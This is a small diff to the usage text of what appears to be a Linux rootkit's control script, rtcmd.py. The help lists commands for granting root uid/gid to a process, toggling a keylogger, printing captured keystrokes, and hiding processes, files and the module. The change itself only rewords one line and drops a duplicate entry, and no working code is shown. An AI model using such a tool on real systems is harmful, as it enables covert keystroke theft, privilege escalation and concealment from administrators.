@@ -147,11 +147,10 @@ USAGE:\n\
   $ ./rtcmd.py hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright - uid and gid 0 for writing process\n\
-  tls - toggles keylogger on/off\n\
+  tls - toggles keylogger listening on/off\n\
   keylog -- print keyboard input log; keylogger is set to 0\n\
   hpXXXX - hides process id XXXX\n\
   sp - shows last hidden process\n\
-  tls - toggles keylogger on/off\n\
   thf - toggles hidden files\n\
   mh - hide module\n\
   ms - show module\n\n\
